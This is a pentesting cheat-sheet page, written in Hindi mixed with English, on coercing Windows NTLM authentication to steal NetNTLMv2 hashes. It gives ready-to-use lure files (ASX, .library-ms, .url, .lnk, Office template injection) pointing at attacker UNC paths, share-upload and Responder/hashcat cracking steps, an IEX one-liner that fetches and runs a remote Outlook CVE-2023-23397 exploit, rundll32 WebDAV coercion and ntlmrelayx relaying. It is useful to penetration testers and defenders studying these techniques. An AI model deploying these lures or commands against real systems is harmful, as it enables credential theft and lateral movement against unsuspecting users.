# NTLM creds चुराने की जगहें

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) से सभी बेहतरीन आइडियाज़ देखें, online किसी microsoft word file के download से लेकर ntlm leaks source तक: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

अगर आप **ऐसे share पर write कर सकते हैं जिसे users या scheduled jobs Explorer में browse करते हैं**, तो ऐसे files drop करें जिनका metadata आपके UNC की ओर point करता हो (जैसे `\\ATTACKER\share`). Folder render होने पर **implicit SMB authentication** trigger होती है और आपके listener पर **NetNTLMv2** leak हो जाता है।

1. **Lures generate करें** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. को cover करता है)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **उन्हें writable share पर drop करें** (कोई भी folder जिसे victim खोलता है):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **सुनें और crack करें**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows एक साथ कई files को hit कर सकता है; जो कुछ भी Explorer preview करता है (`BROWSE TO FOLDER`) उसके लिए कोई clicks नहीं चाहिए।

### Windows Media Player playlists (.ASX/.WAX)

अगर आप target को अपने control वाली Windows Media Player playlist open या preview करवाने में सफल हो जाते हैं, तो आप entry को एक UNC path पर point करके Net‑NTLMv2 leak कर सकते हैं। WMP referenced media को SMB के over fetch करने की कोशिश करेगा और implicitly authenticate करेगा।

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
संग्रहण और cracking flow:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer .library-ms files को insecurely handle करता है जब उन्हें सीधे ZIP archive के भीतर से खोला जाता है। अगर library definition एक remote UNC path की ओर point करती है (जैसे, \\attacker\share), तो ZIP के अंदर मौजूद .library-ms को simply browse/launch करने पर Explorer UNC को enumerate करता है और attacker को NTLM authentication emit करता है। इससे NetNTLMv2 मिलता है जिसे offline crack किया जा सकता है या potentially relay किया जा सकता है।

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
ऑपरेशनल स्टेप्स
- ऊपर दिए गए XML के साथ .library-ms file बनाएं (अपना IP/hostname सेट करें).
- इसे zip करें (Windows पर: Send to → Compressed (zipped) folder) और ZIP target को दें.
- NTLM capture listener चलाएं और victim के ZIP के अंदर से .library-ms खोलने का इंतज़ार करें.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows ने calendar items में extended MAPI property PidLidReminderFileParameter को process किया। अगर वह property किसी UNC path (जैसे, \\attacker\share\alert.wav) की ओर points करती है, तो reminder fire होते ही Outlook SMB share से contact करेगा, जिससे user का Net‑NTLMv2 बिना किसी click के leak हो जाएगा। इसे March 14, 2023 को patched किया गया था, लेकिन legacy/untouched fleets और historical incident response के लिए यह अभी भी highly relevant है।

PowerShell (Outlook COM) के साथ quick exploitation:
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener side:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- एक victim को केवल तब Outlook for Windows चलना चाहिए जब reminder trigger हो।
- leak से Net‑NTLMv2 मिलता है, जो offline cracking या relay के लिए उपयुक्त है (pass‑the‑hash नहीं)।

### .LNK/.URL icon-based zero‑click NTLM leak (CVE-2025-50154 – bypass of CVE-2025-24054)

Windows Explorer shortcut icons को automatically render करता है। हाल के research ने दिखाया कि Microsoft के April 2025 patch for UNC-icon shortcuts के बाद भी, shortcut target को UNC path पर host करके और icon को local रखकर बिना किसी click के NTLM authentication trigger करना संभव था (patch bypass को CVE-2025-50154 assigned किया गया)। केवल folder देखना ही Explorer को remote target से metadata retrieve करने के लिए cause करता है, जिससे attacker SMB server को NTLM emit होता है।

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell के माध्यम से Program Shortcut payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- ZIP में shortcut डालें और victim को उसे browse करने दें।
- shortcut को किसी writable share पर रखें जिसे victim खोलेगा।
- उसी folder में अन्य lure files के साथ combine करें ताकि Explorer items का preview करे।

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows `.lnk` metadata को **view/preview** (icon rendering) के दौरान load करता है, केवल execution पर नहीं। CVE‑2026‑25185 एक ऐसा parsing path दिखाता है जहाँ **ExtraData** blocks shell को icon path resolve करने और load के **दौरान** filesystem को touch करने पर मजबूर करते हैं, और path remote होने पर outbound NTLM emit होता है।

Key trigger conditions (`CShellLink::_LoadFromStream` में observed):
- ExtraData में **DARWIN_PROPS** (`0xa0000006`) शामिल करें (icon update routine के लिए gate)।
- ExtraData में **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) शामिल करें, जिसमें **TargetUnicode** populated हो।
- loader `TargetUnicode` में environment variables expand करता है और resulting path पर `PathFileExistsW` call करता है।

अगर `TargetUnicode` किसी UNC path (e.g., `\\attacker\share\icon.ico`) पर resolve होता है, तो **सिर्फ उस folder को देखना** जिसमें shortcut है, outbound authentication trigger कर देता है। यही load path **indexing** और **AV scanning** से भी hit हो सकता है, इसलिए यह एक practical no-click leak surface बन जाता है।

Research tooling (parser/generator/UI) **LnkMeMaybe** project में उपलब्ध है, जिससे Windows GUI का use किए बिना इन structures को build/inspect किया जा सकता है।


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Native **WebDAV client** का abuse करके current logon session को किसी arbitrary **HTTP/WebDAV** endpoint पर authenticate कराया जा सकता है:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
यह क्यों उपयोगी है:
- एक **attacker-controlled WebDAV server** के खिलाफ, यह बिना custom client छोड़े **NTLM over HTTP** को trigger कर सकता है।
- **internal hosts** के खिलाफ, यह laterally move करने से पहले चुपचाप यह **validate** करने का तरीका है कि stolen credentials कहाँ accepted हैं।
- जब **SMB egress** filtered हो लेकिन **HTTP/WebDAV** अभी भी reachable हो, तब यह command एक अच्छा alternative है।

Operational notes:
- स्रोत host पर **WebClient** service running होनी चाहिए।
- `rundll32.exe` `davclnt.dll` को load करता है और Windows को **current user's credentials** का उपयोग करके WebDAV authentication handle करने देता है।
- अगर आप इसे अपनी control वाली infrastructure की ओर point करते हैं, तो NTLM-aware HTTP listener/relay जैसे: का उपयोग करें
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
From a detection perspective, repeated `rundll32.exe davclnt.dll,DavSetCookie` executions against many internal systems are a strong signal of **credential validation / spray-like lateral movement prep** rather than normal user behaviour.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office दस्तावेज़ एक external template का reference ले सकते हैं। अगर आप attached template को UNC path पर सेट करते हैं, तो document खोलने पर SMB के लिए authenticate होगा।

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml और attached template reference जोड़ें:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels को edit करें और rId1337 को अपने UNC पर point करें:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx में Repack करें और deliver करें। अपना SMB capture listener चलाएँ और open होने का wait करें।

relaying या NTLM abuse के लिए post-capture ideas के लिए, देखें:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE-2025-24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
